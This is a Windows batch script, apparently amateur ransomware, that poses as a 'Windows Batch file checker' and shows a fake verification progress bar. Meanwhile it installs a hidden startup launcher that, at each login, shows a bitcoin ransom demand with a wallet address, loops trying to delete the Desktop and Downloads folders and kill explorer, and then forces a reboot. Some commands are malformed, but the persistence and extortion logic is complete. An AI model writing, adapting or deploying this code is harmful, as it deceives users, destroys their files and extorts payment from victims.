@ECHO OFF

::Check If The File Is Started As Administrator::
goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto start
    ) else (
        echo Please start the program as Administrative
    )

    pause >nul

::Fake Bash File Checker::
:start
cls
cd %appdata%

echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo Welcome to Windows Batch file checker
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
pause
:vf
cls
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo   Please enter the path of the file 
echo         did you want to verify
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
set /p web= :  

::Create A File To Start The Ransom Bash File At The Start Up, Invisibly::

echo Set WshShell = CreateObject("WScript.Shell") >> ka.vbs
echo WshShell.run chr(34) ^& "%appdata%\ka.bat" % Chr(34), 0 >> ka.vbs
echo Set WshShell = Nothing >> ka.vbs

::Fake Bash File Checking::
cls 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo                                   = 0 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo []                                = 8 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo [][]                             = 14 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo [][][]                           = 28 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo [][][][]                         = 31 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo [][][][][]                       = 45 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo [][][][][][]                     = 53 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo [][][][][][][]                   = 57 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait 
echo --------------------------------------- 
echo [][][][][][][][]                 = 68 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait 
echo --------------------------------------- 
echo [][][][][][][][][]               = 71 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait 
echo --------------------------------------- 
echo [][][][][][][][][][]             = 78 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait 
echo --------------------------------------- 
echo [][][][][][][][][][][]           = 81 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait 
echo --------------------------------------- 
echo [][][][][][][][][][][][]         = 89 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait
echo --------------------------------------- 
echo [][][][][][][][][][][][][]       = 91 ] 
echo --------------------------------------- 
ping localhost -n 2 > nul
cls 
 
echo Verify 
echo %web%
echo ... Please wait 
echo --------------------------------------- 
echo [][][][][][][][][][][][][][]     = 99 ] 
echo --------------------------------------- 
ping localhost -n 4 > nul
cls 

::Startup Ransomware::
echo msg * To get back your normall shit... send 0,0031 bitcoin to: 13h4EMjcusGEMXo2z8pV9UGEGWd8cyiSZs >> ka.bat
echo ping localhost -n 4 >> ka.bat
echo msg RIP >> ka.bat
echo :lol >> ka.bat
echo rmdir "%currentuser%\Desktop" >> ka.bat
echo rmdir "%currentuser%\Downloads" >> ka.bat
echo taskkill explorer.exe >> ka.bat
echo goto lol >> ka.bat

::Create The .lnk File For Start As Startup::
set SCRIPT="GO.vbs"
 
echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
echo sLinkFile = "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\start.lnk" >> %SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
echo oLink.TargetPath = "%appdata%\ka.vbs" >> %SCRIPT%
echo oLink.Save >> %SCRIPT%
 
cscript %SCRIPT%
del %SCRIPT%
cls

::Fake Bash Verified::
echo File as been Verify
echo Stroke a key to see results
pause > nul
cls

::Fake Bash Verified Bugging::
echo F!LeS 4s b3En ^3r!fY
echo 5tr0k3 4 k3Y t0 Se3 R35Ult5
pause > nul
cls

::The Last Words::
ping localhost -n 4 > nul
echo ... Please @$y 4$4in
ping localhost -n 2 > nul
echo Hmmm
ping localhost -n 2 > nul
echo still using this poop?
ping localhost -n 2 > nul
start https://www.csoonline.com/article/3236183/what-is-ransomware-how-it-works-and-how-to-remove-it.html
echo LOL
ping localhost -n 2 > nul
echo its not good idea to restart you pc
ping localhost -n 2 > nul
echo shutdown -s
echo oopsy
ping localhost -n 4 > nul
shutdown -r

